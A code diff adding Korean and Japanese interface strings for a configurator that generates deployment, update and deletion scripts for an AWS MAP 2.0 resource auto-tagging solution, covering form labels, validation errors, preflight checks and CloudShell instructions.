+            ui_delete_scope_title:'특정 MAP 참여(MPE)로 제한',
+            ui_delete_scope_desc:'체크하지 않으면 이 리전에서 발견된 모든 MAP Auto-Tagger 배포(map-auto-tagger-mig*와 일치하는 스택 및 스택셋)가 삭제됩니다.',
+            ui_delete_scope_all:'이 리전의 모든 map-auto-tagger-mig* 배포',
+            ui_delete_scope_specific:'특정 MPE(들)',
+            ui_delete_mpe_label:'삭제할 MPE ID',
+            ui_delete_mpe_hint:'— 각 MPE는 이 리전에 배포된 MAP Auto-Tagger와 일치해야 합니다',
+            ui_delete_add_mpe:'+ 다른 MPE 추가',
+            err_delete_mpe:'MAP 참여 ID는 대문자 영문자(A–Z)와 숫자(0–9)로 된 정확히 10자리여야 하며, 최소 하나의 문자와 하나의 숫자를 포함해야 합니다',
+            ui_delete_optin_title:'선택 사항 — CloudWatch 로그 그룹',
+            ui_delete_optin_logs:'CloudWatch 로그 그룹 삭제',
+            ui_delete_optin_logs_hint:'— 감사 이력을 제거합니다. 기본적으로 로그는 보존됩니다.',
+            ui_delete_optin_bucket:'S3 스테이징 버킷',
+            ui_delete_bucket_conditional:'다른 배포가 남아 있지 않은 경우에만 삭제',
+            ui_delete_bucket_yes:'예 — 남은 배포가 없습니다',
+            ui_delete_bucket_note:'S3 스테이징 버킷은 자동으로 처리됩니다: 계정에 다른 MAP Auto-Tagger 배포가 남아 있지 않을 때만 삭제됩니다.',
+            ui_delete_review_subtitle:'삭제될 항목을 확인하세요',
+            ui_delete_confirm_title:'⚠️ 확인하려면 DELETE를 입력하세요',
+            ui_delete_confirm_hint:'이 작업은 CloudFormation 리소스를 삭제합니다. AWS 리소스의 기존 map-migrated 태그는 보존되지만, Lambda는 즉시 새 리소스 태깅을 중단합니다.',
+            ui_delete_confirm_label:'확인을 위해 DELETE를 입력하세요',
+            err_delete_confirm:'진행하려면 "DELETE"를 입력하세요',
+            ui_delete_generate:'delete.sh 생성 →',
+            ui_delete_download:'⬇ delete.sh 다운로드',
+            ui_delete_step3_subtitle:'배포된 계정에서 AWS CloudShell을 통해 실행하세요',
+            d_instr_title:'삭제 지침 — MAP Auto-Tagger',
+            d_instr_region_label:'리전:',
+            d_instr_scope_label:'범위:',
+            d_instr_version_label:'템플릿 버전:',
+            d_instr_scope_specific:'MPE —',
+            d_instr_scope_all:'이 리전의 모든 MAP Auto-Tagger 배포',
+            d_instr_opt1:'옵션 1: AWS CloudShell (권장)',
+            d_instr_opt1_step1:'1. 배포가 수행된 계정의 AWS 콘솔에 로그인합니다.\n   (다중 계정 배포의 경우 관리 계정입니다.)',
+            d_instr_opt1_step2:'2. CloudShell을 엽니다.',
+            d_instr_opt1_step3:'3. delete.sh를 업로드하고 실행하세요:',
+            d_instr_opt2:'옵션 2: 로컬 AWS CLI',
+            d_instr_opt2_step1:'1. AWS CLI v2가 설치되어 있고 관리자 자격 증명으로 구성되어 있는지 확인합니다.',
+            d_instr_opt2_step2:'2. 실행: bash delete.sh',
+            d_instr_what_title:'스크립트가 수행하는 작업:',
+            d_instr_what_scoped:'나열된 각 MPE의 스택 또는 스택셋을 조회하고 삭제합니다.',
+            d_instr_what_all:'리전의 모든 map-auto-tagger-mig* 스택과 스택셋을 열거하고 삭제합니다.',
+            d_instr_what_stackset:'스택셋의 경우: 스택 인스턴스를 병렬로 삭제한 다음(100% 허용 오차) 스택셋을 삭제합니다.',
+            d_instr_what_stack:'스택의 경우: delete-stack을 실행하고 완료를 기다립니다.',
+            d_instr_what_bucket:'리전에 MAP Auto-Tagger 배포가 남아 있지 않을 때만 S3 스테이징 버킷을 삭제합니다. 그렇지 않으면 형제 배포가 중단되지 않도록 유지됩니다.',
+            d_instr_logs_delete:'일치하는 CloudWatch 로그 그룹을 삭제합니다.',
+            d_instr_logs_preserve:'CloudWatch 로그 그룹 (감사 이력 보존됨).',
+            d_instr_preserved_title:'보존됨 (절대 삭제되지 않음):',
+            d_instr_preserved_tags:'AWS 리소스의 map-migrated 태그 (MAP 크레딧은 그대로 유지됨).',
+            d_instr_preserved_iam:'스택셋 관리자 및 실행 IAM 역할 (공유 조직 스캐폴딩).',
+            d_instr_idempotent:'멱등성: 다시 실행해도 안전합니다. 누락된 리소스는 실패가 아닌 건너뜀으로 보고됩니다.',
+            ui_version_history_title:'버전 기록 — 무엇이 변경되었습니까?',
+            ui_version_released:'출시일',
+            ui_version_current:'현재 대상',
+            ui_version_full_changelog:'GitHub에서 전체 변경 로그 보기',
+            ui_version_tag_bugfix:'버그 수정',
+            ui_version_tag_coverage:'신규 지원',
+            ui_version_tag_breaking:'주요 변경',
+            ui_version_tag_security:'보안',
+            ui_version_tag_perf:'성능',
+            ui_version_tag_other:'기타',
+            ui_editor_back:'← 뒤로',
+            ui_editor_review:'검토 →',
+            ui_editor_review_title:'구성 검토',
+            ui_editor_review_subtitle:'업데이트 스크립트를 생성하기 전에 설정을 확인하세요',
+            ui_editor_review_accounts:'계정',
+            ui_editor_confirm_text:'지정된 MPE ID와 선택한 리전에 MAP Auto-Tagger가 이미 배포되어 있으며, 두 값이 모두 정확하다는 것을 확인합니다.',
+            ui_editor_confirm_risk:'잘못된 정보로 이 스크립트를 생성하고 실행하면 잘못된 StackSet이 업데이트되거나, 계정 범위가 손상되거나, 리소스에 잘못된 MAP 참여 ID가 태깅될 수 있습니다 — 이로 인한 MAP 크레딧 손실은 소급하여 복구할 수 없습니다.',
+            err_editor_confirm:'업데이트 스크립트를 생성하기 전에 확인해야 합니다',
+            ui_editor_generate:'update.sh 생성 →',
+            ui_editor_step3_title:'스크립트 준비 완료',
+            ui_editor_step3_subtitle:'관리 계정의 AWS CloudShell에서 실행하세요',
+            ui_editor_download:'⬇ update.sh 다운로드',
+            ui_editor_script_preview:'스크립트 미리보기',
+            err_date_required:'협약 시작일을 입력해 주세요',
+            err_date_end:'협약 종료일은 시작일 이후여야 합니다',
+            err_vpc_required:'VPC ID를 하나 이상 입력해 주세요.',
+            err_vpc_format:'잘못된 VPC ID 형식입니다. vpc- 다음에 8~17자의 16진수 문자가 와야 합니다 (예: vpc-0abc1234def56789).',
+            err_duplicate_vpc:'중복된 VPC ID가 있습니다. 중복을 제거해 주세요.',
+            err_central_account_required:'중앙 계정 ID를 입력해 주세요 (12자리 숫자).',
+            d_title:'MAP 2.0 자동 태거 설정',
+            d_tag_label:'태그 값', d_region_label:'리전', d_account_label:'계정',
+            d_step1:'1단계/3: 계정 확인 중...',
+            d_step2:'2단계/3: 자동 태거 설정 중...',
+            d_step2_wait:'(보통 1~2분 소요됩니다)',
+            d_step2_wait_multi:'(보통 10~15분 소요됩니다)',
+            d_step3:'3단계/3: 배포 보고서 저장 중...',
+            d_ok_creds:'AWS 계정에 성공적으로 연결되었습니다.',
+            d_fail_creds:'AWS 계정에 연결할 수 없습니다.',
+            d_fix_creds:'세션이 만료되었을 수 있습니다. AWS CloudShell을 닫고 다시 열어 스크립트를 실행하세요.',
+            d_ok_trail:'활동 로깅이 활성화되어 있습니다:',
+            d_fail_trail:'활동 로깅(CloudTrail)이 활성화되어 있지 않습니다:',
+            d_fix_trail1:'AWS 콘솔 → CloudTrail → 트레일 생성으로 이동하세요.',
+            d_fix_trail2:'다음 리전을 반드시 포함해야 합니다:',
+            d_ok_perms:'배포 권한이 설정되어 있습니다.',
+            d_fail_perms:'계정에 필요한 배포 권한이 없습니다.',
+            d_fix_perms:'AWS 관리자에게 AWS CloudFormation, IAM, AWS Lambda, Amazon EventBridge, AWS Systems Manager, Amazon SNS, Amazon SQS, Amazon CloudWatch 권한을 요청하세요.',
+            d_ok_org:'올바른 계정(관리 계정 또는 위임된 관리자)에서 실행 중입니다.',
+            d_ok_org_delegated:'CloudFormation StackSets의 위임된 관리자로 실행 중입니다.',
+            d_fail_org:'이 스크립트는 조직의 관리 계정 또는 CloudFormation StackSets의 위임된 관리자 계정에서 실행해야 합니다.',
+            d_fix_org:'AWS CloudShell을 관리 계정(또는 위임된 관리자 계정)으로 전환하고 스크립트를 다시 실행하세요. 어느 계정인지 모르는 경우 AWS 계정 팀에 문의하세요.',
+            d_warn_stacksets:'다중 계정 배포 통합이 아직 활성화되지 않았습니다 — 배포 중에 자동으로 설정됩니다.',
+            d_ok_stacksets:'다중 계정 배포 통합이 활성화되어 있습니다.',
+            d_ok_scp:'태그 서비스를 차단하는 보안 정책이 없습니다.',
+            d_ok_vpc:'이 계정에 VPC가 존재합니다:',
+            d_fail_vpc:'이 계정/리전에서 VPC를 찾을 수 없습니다:',
+            d_fix_vpc:'VPC ID가 올바르고 대상 계정과 리전에 존재하는지 확인하세요.',
+            d_ok_account_scope:'조직에 계정이 존재합니다:',
+            d_fail_account_scope:'조직에서 계정을 찾을 수 없습니다:',
+            d_fix_account_scope:'계정 ID가 조직에 속한 유효한 12자리 계정인지 확인하세요.',
+            d_fail_scp:'조직의 보안 정책이 태그 서비스를 차단하고 있습니다.',
+            d_fix_scp:"AWS 보안 팀에 연락하여 Lambda 실행 역할에 'tag:TagResources' 작업을 허용해 달라고 요청하세요.",
+            d_scp_note:"(참고: 조직에서 리소스 생성 시 태그를 요구하는 경우 보안 팀에 'map-migrated' 태그 키를 제외해 달라고 요청하세요.)",
+            d_all_passed:'모든 확인이 통과되었습니다.',
+            d_checks_failed:'개의 확인이 실패했습니다. 위의 단계를 따른 후 스크립트를 다시 실행하세요.',
+            d_fix_label:'→ 해결 방법:',
+            d_deploying:'배포가 진행 중입니다. Ctrl+C를 눌러도 안전합니다 — 백그라운드에서 계속 진행됩니다.',
+            d_still_deploying:'아직 설정 중...',
+            d_elapsed:'경과',
+            d_deploy_failed:'설정에 실패했습니다. 아래 보고서를 AWS 계정 팀과 공유해 주세요.',
+            d_complete_title:'설정 완료!',
+            d_complete_single:'새 리소스는 생성 후 1~2분 이내에 자동으로 태그가 지정됩니다 (최대 15분 소요 가능).',
+            d_complete_multi:'조직의 모든 계정에서 자동 태그 지정이 활성화되었습니다.',
+            d_backfill_msg:'백필이 곧 실행될 예정입니다.',
+            d_backfill_waiting:'백필 완료를 기다리는 중...',
+            d_backfill_wait_info:'(백필이 곧 시작되며 최대 15분이 소요될 수 있습니다)',
+            d_backfill_starting:'백필이 실행 중입니다...',
+            d_backfill_in_progress:'백필 진행 중...',
+            d_backfill_timeout:'백필이 아직 실행 중입니다. 보고서가 저장되었습니다 — 최종 결과는 CloudWatch에서 확인하세요:  aws logs tail /aws/lambda/map-auto-tagger-backfill',
+            d_backfill_done:'백필 완료.',
+            r_backfill_result:'백필 결과',
+            d_backfill_since:'다음 날짜 이후에 생성된 기존 리소스에 태그를 지정합니다:',
+            d_report_saved:'배포 보고서 저장 위치:',
+            d_share_report:'이 파일을 AWS 계정 팀과 공유하세요.',
+            r_title:'MAP 2.0 자동 태거 — 배포 보고서',
+            r_customer:'고객', r_mpe:'MPE ID', r_region:'리전', r_account:'계정',
+            r_date:'날짜 / 시간', r_result:'결과',
+            r_preflight:'사전 점검 결과:',
+            r_deployed:'배포된 항목:',
+            r_verify:'확인 방법:',
+            r_backfill:'백필 상태:',
+            r_perstatus:'계정별 상태:',
+            r_support:'지원:',
+            r_action:'필요한 조치:',
+            r_verify1:'1. AWS 계정에서 임의의 리소스를 생성하세요',
+            r_verify2:'2. 1~2분 대기하세요 (바쁜 시간에는 최대 15분)',
+            r_verify3:'3. 리소스에 다음 태그가 있는지 확인하세요: map-migrated =',
+            r_share_help:'도움이 필요하시면 이 보고서를 AWS 계정 팀과 공유하세요.',
+            r_contact:'도움이 필요하시면 AWS 계정 팀에 문의하세요.',
+            r_action_desc:'위의 실패한 항목을 해결한 후 deploy.sh를 다시 실행하세요.'
+          },
+          ja: {
+            ui_title:'MAP 2.0 Auto-Tagger Configurator',
+            ui_btn_download:'ダウンロード',
+                        ui_instr_opt1_title:'オプション1: AWS CloudShell（推奨）',
+            ui_instr_opt2_title:'オプション2: ローカル AWS CLI',
+            ui_instr_cli_prereq_single:'AWS CLI v2がインストールされ、移行アカウントの認証情報で設定されていることを確認してください。',
+            ui_instr_cli_prereq_multi:'AWS CLI v2がインストールされ、管理アカウントの認証情報で設定されていることを確認してください。',
+            ui_instr_cli_download:'deploy.shをコンピュータにダウンロードしてください。',
+            ui_instr_cli_download_all:'3つのファイルをすべてコンピュータにダウンロードしてください。',
+            ui_instr_cli_terminal:'ターミナルを開く（Linux/macOS）またはWSL/Git Bash（Windows）',
+            ui_cli_alt_short:'該当アカウントにAWS CLIを設定して実行:',
+            ui_instr_single_title:'デプロイ手順 — シングルアカウント',
+ui_instr_single_title:'デプロイ手順 — シングルアカウント',
+            ui_instr_multi_title:'デプロイ手順 — マルチアカウント',
+            ui_instr_login_single:'移行アカウントのAWSコンソールにログインします。',
+            ui_instr_login_multi:'管理アカウントのAWSコンソールにログインします。',
+            ui_instr_open_cloudshell:'CloudShellを開きます（上部メニューバーのターミナルアイコンをクリック）。',
+            ui_instr_upload_files:'ファイルをアップロードします（CloudShell → アクション → ファイルをアップロード）:',
+            ui_instr_upload_all:'3つのファイルをすべてアップロードします（CloudShell → アクション → ファイルをアップロード）:',
+            ui_instr_run:'実行:',
+            ui_instr_done_single:'完了。スクリプトがデプロイし、完了時に確認します。',
+            ui_instr_done_multi:'完了。全アカウントで自動タグ付けが有効になりました。',
+            ui_instr_verify_title:'タグ付けの動作確認（デプロイ後）:',
+            ui_instr_expected:'期待される結果',
+            ui_instr_thats_it:'完了です。140以上のリソースタイプで自動タグ付けが有効になりました。',
+            ui_instr_existing_only:'既存リソースには影響しません — 新しく作成されたリソースのみに適用されます。',
+            ui_instr_auto_handles:'スクリプトがすべてを自動的に処理します:',
+            ui_instr_uploads_s3:'S3へテンプレートをアップロード',
+            ui_instr_enables_stacksets:'組織でStackSetsを有効化',
+            ui_instr_discovers_org:'組織構造を自動検出',
+            ui_instr_deploys_all:'全アカウントにデプロイ（約10分）',
+            ui_instr_check_status:'実行後のステータス確認',
+            ui_instr_files_received:'3つのファイルを受け取りました',
+            ui_instr_target_accounts:'対象アカウント',
+            ui_instr_all_accounts:'（アカウント未指定）',
+            ui_instr_all_org:'組織内の全アカウント',
+            ui_instr_cloudtrail_note:'注意: 各アカウントと対象リージョンでCloudTrailが有効になっている必要があります。',
+            ui_sample_notice_title:'サンプルコードに関する注意:',
+            ui_sample_notice_body:"これは非本番環境向けのサンプルコードです。デプロイ前に、組織のセキュリティ・規制・コンプライアンス要件を満たすようにテスト、セキュリティ強化、最適化を行う責任はお客様にあります。このソリューションのデプロイにより、AWS Lambda、Amazon EventBridge、Amazon CloudWatch、Amazon SNS、Amazon SQS、AWS Systems ManagerのAWS料金が発生する場合があります。詳細:",
+            ui_shared_responsibility:'AWS責任共有モデル',
+            ui_btn_copy:'手順をコピー',
+            ui_one_file_step:'1ファイル。1ステップ。',
+            ui_send_script:'',
+            ui_to_customer:'をお客様に送付してください。',
+            ui_cloudshell_open:'お客様は',
+            ui_in_account:'の',
+            ui_upload_and_run:'でAWS CloudShellを開き、このファイルをアップロードして実行:',
+            ui_mgmt_account:'管理アカウント',
+            ui_migration_account_label:'移行アカウント',
+            d_log_pass:'成功:',
+            d_log_fail:'失敗:',
+            d_log_warn:'警告:',
+            ui_main_desc1:'新しいAWSリソースに自動でタグ付けするCloudFormationテンプレートを生成します。タグ:',
+            ui_main_desc2:'の付与は通常',
+            ui_main_desc3:'60〜90秒以内（高負荷時は最大15分）',
+            ui_main_desc4:'で完了します。',
+            ui_main_desc5:'対応範囲:',
+            ui_main_desc6:'種類以上のリソースタイプ（主要AWSサービス全対応、CT org E2Eテスト済み）。',
+            ui_main_desc7:'お客様のコスト:',
+            ui_step1:'1. 設定', ui_step2:'2. 確認', ui_step3:'3. ダウンロード',
+            ui_card_deal_title:'MAP 2.0 契約情報',
+            ui_card_deal_subtitle:'AWS InvestmentsのMAP契約情報を入力してください',
+            ui_customer_name:'顧客名', ui_customer_name_hint:'（ファイル名生成にのみ使用）',
+            ui_customer_name_placeholder:'例：株式会社ABC',
+            ui_mpe_tag:'MAP エンゲージメントID',
+            ui_mpe_hint:'(AWS Investmentsの10文字の英数字コード — 例: A1B2C3D4E5)',
+            ui_agree_start:'契約開始日', ui_agree_start_hint:'（MAPリソースへのタグ付け開始日）',
+            ui_agree_end:'契約終了日', ui_agree_end_hint:'（タグ付け停止日）',
+            ui_alert_email:'アラートメール', ui_alert_email_hint:'（任意 — タグエラー通知を受信するメールアドレス）',
+            ui_alert_email_missing_warn:'⚠️ アラートメールが設定されていません。タグ付けの失敗（IAM拒否、タグクォータ、サービスドリフト）は静かに破棄されます — SNSもDLQアラームの送信先もありません。scripts/add_subscriber.sh を使用するか、configurator を再実行することで後からサブスクライバーを追加できます。\n\nアラートサブスクライバーなしで続行しますか？',
+            ui_email_confirm_hint:'デプロイ後、お客様はAWSサブスクリプション確認メールを承認する必要があります。',
+            ui_deploy_mode:'デプロイモード', ui_deploy_mode_subtitle:'マイグレーションに使用するAWSアカウント数を選択してください',
+            ui_single_title:'シングルアカウント', ui_single_desc:'1つのマイグレーションアカウントにデプロイします。約2分で完了します。',
+            ui_multi_title:'マルチアカウント (AWS Organizations)', ui_multi_desc:'AWS Organizationの全アカウントにStackSetで同時にデプロイします。',
+            ui_backfill_title:'既存リソースの一括タグ付け', ui_optional:'（任意）',
+            ui_coverage_title:'タグ付け対象',
+            ui_btn_next:'次へ：確認 →', ui_btn_back:'← 戻る', ui_btn_generate:'生成してダウンロード →',
+            ui_tagging_scope:'タグ付け範囲', ui_vpc_scope_hint:'デフォルトでは、アカウント内のすべての新しいリソースにタグが付けられます。移行ワークロードと非移行ワークロードが同じアカウントを共有する場合はVPCスコープを使用してください。',
+            ui_vpc_limit:'特定のVPCのみにタグ付けを制限',
+            ui_tag_non_vpc:'非VPCリソースにもタグを付ける (S3、DynamoDB、Lambda、SNS、SQS など)',
+            ui_tag_non_vpc_hint:'これらのサービスにはVPC関連付けがありません。MAP適格性のためにVPCスコープに関係なくすべてにタグを付けることを推奨します。',
+            ui_vpc_ids:'VPC ID', ui_vpc_ids_hint:'(これらのVPC内のVPCバインドリソースのみタグが付けられます)',
+            ui_add_vpc:'+ VPCを追加', ui_add_account:'+ アカウントを追加', ui_add_region:'+ リージョンを追加',
+            ui_migration_account_ids:'移行アカウントID', ui_migration_account_ids_hint:'(参考情報 — スタックは組織全体に自動的にデプロイされます)',
+            ui_stackset_note:'Lambdaはルート OUを経由して組織内の全アカウントにデプロイされます。デフォルトでは全アカウントのリソースにタグ付けされます。特定アカウントのみにタグ付けを制限することもできます。',
+            ui_stackset_bucket_note:'このデプロイメントは、StackSet用のCloudFormationテンプレートをステージするために一時的なS3バケット（auto-map-tagger-{account-id}）を作成します。StackSetが将来組織に追加される新しいアカウントへのデプロイに使用するため、バケットはデプロイ後も保持されます。',
+            ui_account_limit:'特定のアカウントのみにタグ付けを制限',
+            err_account_scope_required:'アカウントIDを1つ以上入力してください。',
+            err_account_format:'アカウントIDが無効です。正確に12桁の数字である必要があります。',
+            err_duplicate_account:'重複するアカウントIDがあります。重複を削除してください。',
+            ui_central_account_id:'中央アカウントID', ui_central_account_id_hint:'(Lambdaがデプロイされるアカウント)',
+            ui_member_accounts:'MAPスコープのメンバーアカウント',
+            ui_deployment_regions:'デプロイリージョン', ui_deployment_regions_hint:'(お客様がリソースを作成するリージョン)',
+            ui_backfill_strong:'契約開始日以降に作成された既存リソースにタグを付ける',
+            ui_backfill_scope_note:'✓ スコープ適用中：バックフィルは上記で選択したVPC／アカウントのスコープ設定に従います。',
+            ui_backfill_desc:'契約開始日からCloudTrail履歴を照会し、このソリューションのデプロイ前に作成されたリソースにタグを付ける一回限りのLambdaをデプロイします。デプロイ後約5分で自動的に実行されます。',
+            ui_backfill_note:'注意: CloudTrail履歴は過去90日間に限定されます。それ以前に作成されたリソースは手動でタグを付ける必要があります。',
+            ui_coverage_subtitle:'マルチアカウントCT組織テストで確認済み140+リソースタイプ (4アカウント × 4リージョン)',
+            ui_review_title:'設定の確認', ui_review_subtitle:'テンプレートを生成する前に設定を確認してください',
+            ui_what_deployed:'デプロイされる内容',
+            ui_template_ready:'テンプレート準備完了', ui_template_ready_subtitle:'デプロイ手順と一緒にお客様に共有してください',
+            ui_prereq_title:'お客様の前提条件', ui_prereq_subtitle:'生成されたdeploy.shがデプロイ前に自動的に確認します:',
+            ui_prereq_cloudtrail:'ターゲットリージョンでCloudTrailが有効になっていること',
+            ui_prereq_perms:'デプロイ担当者にAWS CloudFormation権限があること (IAM、AWS Lambda、Amazon EventBridge、AWS Systems Manager、Amazon SNS、Amazon SQS、Amazon CloudWatch)',
+            ui_prereq_org:'管理アカウントにAWS OrganizationsおよびCloudFormation StackSetsの信頼アクセスが有効になっていること',
+            ui_scp_title:'⚠️ サービスコントロールポリシー(SCP)に関する注意',
+            ui_scp_intro:'お客様の組織がSCPを使用している場合は、デプロイ前に以下を確認してください:',
+            ui_deploy_instructions:'お客様のデプロイ手順',
+            ui_template_preview:'テンプレートプレビュー', ui_download_template:'CloudFormationテンプレートをダウンロード', ui_download_template_note:'オプション — デプロイ前にCloudFormationコードを確認したいお客様向けです。', ui_start_over:'最初からやり直す',
+            ui_cost_note:'推定月額費用: ', ui_cost_note2:' / アカウント（Lambda呼び出し + CloudWatch）。AWS Config不要。',
+            ui_scp_tagging:'タグ付けSCP — SCPがLambda実行ロールに対してtag:TagResources、ec2:CreateTagsなどのタグ付けアクションを拒否していないことを確認してください。deploy.shはデプロイ後にIAMシミュレーションチェックを実行しますが、SCPはAWS Organizationsコンソールで手動確認が必要です。',
+            ui_scp_mandatory:'必須タグSCP — SCPがリソース作成時にタグの存在を要求する場合、このソリューションはその要件を満たしません（タグは作成後60〜90秒後に適用）。お客様はmap-migratedタグキーを作成時要件から除外するか、猶予期間を設定する必要があります。',
+            rv_not_specified:'(未指定)', rv_none:'(なし)', rv_none_specified:'(未指定)',
+            rv_yes:'はい', rv_no:'いいえ', rv_disabled:'無効', rv_enabled:'有効',
+            rv_multi_method:'マルチアカウント方式', rv_stackset:'StackSet（アカウントごとのLambda）', rv_central:'中央Lambda（クロスアカウント）',
+            rv_target_accounts:'対象アカウント', rv_tag_non_vpc:'非VPCサービスのタグ付け',
+            rv_all_resources:'対象アカウントのすべてのリソース',
+            rv_backfill_enabled:'有効 — 契約開始日以降の既存リソースにタグ付け（デプロイ後約5分）',
+            rv_desc_single:'CloudFormationスタック1つ。お客様のアカウントに直接デプロイ：',
+            rv_desc_stackset:'ファイル2つを生成。管理アカウントテンプレートを1回デプロイするだけで、組織構造を自動検出して指定アカウントにプロビジョニングします：',
+            rv_desc_central:'1つのアカウントに中央Lambda + 各メンバーアカウントにクロスアカウントIAMロール：',
+            rv_deploy_mgmt:'管理アカウントにデプロイ', rv_deploy_accounts:'S3にアップロード、各アカウントにデプロイ',
+            rv_targets:'対象', rv_specific_accounts:'件の特定アカウント', rv_targets_all:'組織内のすべてのアカウントが対象',
+            rv_res_lambda:'AWS Lambda関数', rv_res_lambda_desc:'作成後60〜90秒以内に新しいリソースに自動タグ付け',
+            rv_res_eventbridge:'Amazon EventBridgeルール', rv_res_eventbridge_desc:'すべてのサービスで200以上のCreate/Run/Put/Publishイベントをキャプチャ',
+            rv_res_ssm:'AWS Systems Managerパラメータ', rv_res_ssm_desc:'MAP ID、契約日、スコープ設定を保存',
+            rv_res_iam:'IAMロール', rv_res_iam_desc:'100以上のサービス固有のタグ付け権限、最小権限',
+            rv_res_dlq:'Amazon SQSデッドレターキュー', rv_res_dlq_desc:'失敗したタグ付けイベントを再試行/監査のためにキャプチャ',
+            rv_res_sns:'Amazon SNSトピック + Amazon CloudWatchアラーム', rv_res_sns_desc:'タグ付けエラー時に通知（5分以内に3件以上の失敗）',
+            rv_res_custom:'カスタムリソース（Lambda）', rv_res_custom_desc:'デプロイ時にルートOU IDを自動検出 — お客様の操作不要',
+            err_mpe_invalid:"MAP IDは正確に10文字で、英大文字(A–Z)と数字(0–9)のみ使用可能、かつ文字と数字をそれぞれ1文字以上含む必要があります",
+            ui_landing_title:'何をしますか？',
+            ui_landing_subtitle:'オプションを選択して開始してください',
+            ui_mode_deploy_title:'新しいMAP Auto-Taggerをデプロイ',
+            ui_mode_deploy_desc:'新しいMAP 2.0エンゲージメント向けのデプロイスクリプトを生成します。単一アカウントおよびマルチアカウント（AWS Organizations）のデプロイに対応しています。',
+            ui_mode_edit_title:'既存のデプロイを編集',
+            ui_mode_edit_desc:'デプロイ済みのMAP Auto-Taggerのスコープに対してAWSアカウントを追加または削除します。完全な再デプロイなしで更新スクリプトを生成します。',
+            ui_mode_edit_note:'マルチアカウント（AWS Organizations）デプロイ専用',
+            ui_estep1:'1. 設定', ui_estep2:'2. 確認', ui_estep3:'3. ダウンロード',
+            ui_editor_info:'このツールはMAP Auto-Tagger Configuratorで作成された既存のデプロイを変更します。再デプロイなしでアカウントスコープを更新するupdate.shスクリプトを生成します。',
+            ui_editor_step1_title:'デプロイ詳細',
+            ui_editor_step1_subtitle:'既存のMAP Auto-Taggerデプロイの詳細を入力してください',
+            ui_editor_mpe_hint:'— 元のデプロイと一致する必要がある10文字の英数字コード',
+            ui_editor_region:'デプロイリージョン',
+            ui_editor_region_hint:'— 管理スタックがデプロイされたリージョン',
+            ui_editor_region_placeholder:'リージョンを選択...',
+            err_editor_region:'デプロイリージョンを選択してください',
+            ui_editor_action_title:'アクション',
+            ui_editor_action_subtitle:'MAPスコープに対してアカウントを追加するか削除するかを選択してください',
+            ui_editor_add_title:'MAPスコープにアカウントを追加',
+            ui_editor_add_desc:'選択したアカウントのリソースがMAPタグでタグ付けされるようになります。',
+            ui_editor_add_accounts_label:'追加するアカウントID',
+            ui_editor_add_accounts_hint:'— 現在スコープ外のアカウントのみ',
+            err_editor_account:'有効な12桁のアカウントIDを1つ以上入力してください',
+            ui_editor_backfill_title:'新しく追加されたアカウントのバックフィルを再実行',
+            ui_editor_backfill_desc:'契約開始日からCloudTrail履歴を照会し、新しく追加されたアカウントの既存リソースにタグを適用します。StackSet更新中に自動的に実行されます。結果はCloudWatch Logs（map-auto-tagger-backfill）で確認できます。',
+            ui_editor_backfill_note:'注意：CloudTrail履歴は過去90日間に限られます。それ以前に作成されたリソースは手動でタグ付けが必要です。',
+            ui_editor_remove_title:'MAPスコープからアカウントを削除',
+            ui_editor_remove_desc:'選択したアカウントはタグ付けされなくなります。既存のタグは削除されません。Lambdaはそのアカウントでは非アクティブのまま残ります。',
+            ui_editor_remove_accounts_label:'削除するアカウントID',
+            ui_editor_remove_accounts_hint:'— 現在スコープ内のアカウントのみ',
+            ui_mode_update_title:'最新のテンプレートバージョンに更新',
+            ui_mode_update_desc:'Lambdaコード、IAMポリシー、EventBridgeルールを現在のテンプレートバージョンにアップグレードします。スコープ設定（アカウント、VPC、契約日）は保持されます。シングルアカウントおよびマルチアカウントのデプロイを自動検出します。',
+            ui_ustep1:'1. 構成',
+            ui_ustep2:'2. 確認',
+            ui_ustep3:'3. ダウンロード',
+            ui_update_info:'このツールは既存のMAP Auto-Tagger デプロイを最新のテンプレートバージョンにアップグレードします。スコープ設定を維持し、シングルアカウントとマルチアカウントのデプロイを自動検出する <code>update.sh</code> スクリプトを生成します。',
+            ui_update_step1_title:'デプロイ詳細',
+            ui_update_step1_subtitle:'アップグレードのリージョンと任意のスコープを入力してください',
+            ui_update_info_detail:'生成された <code>update.sh</code> は SSM Parameter Store (<code>/auto-map-tagger/&lt;mpe&gt;/version</code>) から現在のテンプレートバージョンを読み取り、ターゲットバージョンと比較します。<code>--force</code> なしでは、メジャーバージョンをまたぐアップグレード（例：v19 → v21）を拒否します。SemVer に従い、MAJOR バンプのみで顧客のアクションが必要です。',
+            ui_update_scope_title:'特定の MAP エンゲージメントのみを更新',
+            ui_update_scope_desc:'チェックを外すと、このアカウントでスクリプトが見つけたすべての MAP Auto-Tagger デプロイ（<code>map-auto-tagger-mig*</code> に一致するスタックおよびスタックセット）を更新します。',
+            ui_update_mpe_label:'更新する MPE ID',
+            ui_update_mpe_hint:'— 各 MPE はこのリージョンにデプロイされた MAP Auto-Tagger と一致する必要があります',
+            ui_update_add_mpe:'+ 別の MPE を追加',
+            err_update_mpe:'有効な 10 文字の MPE ID を少なくとも 1 つ入力してください',
+            ui_update_scope_review:'更新スコープ',
+            ui_update_all_review:'このアカウントのすべての MAP Auto-Tagger デプロイ',
+            ui_update_target_version:'ターゲットテンプレートバージョン',
+            ui_update_confirm_text:'一覧に記載された MAP Auto-Tagger デプロイが選択したリージョンに存在し、ターゲットテンプレートバージョンへのアップグレードが意図したものであることを確認します。',
+            ui_update_confirm_risk:'アップグレードは、一致するすべてのスタックの Lambda コード、IAM ポリシー、EventBridge ルールを置き換えます。スコープと契約日は <code>--use-previous-parameters</code> により保持されますが、ロールアウトが失敗すると、スタックが UPDATE_ROLLBACK_COMPLETE 状態のままになり、手動回復が必要になる場合があります。',
+            err_update_confirm:'更新スクリプトを生成する前に確認してください',
+            ui_update_step3_subtitle:'デプロイが実施されたアカウントの AWS CloudShell で実行してください',
+            ui_mode_delete_title:'既存のデプロイを削除',
+            ui_mode_delete_desc:'アカウントから MAP Auto-Tagger デプロイを削除します。デフォルトでは、リージョン内のすべての map-auto-tagger-mig* スタックとスタックセットを削除します。特定の MPE にスコープを限定することも可能です。既にタグ付けされたリソースの map-migrated タグは削除されません。',
+            ui_dstep1:'1. 構成',
+            ui_dstep2:'2. 確認',
+            ui_dstep3:'3. ダウンロード',
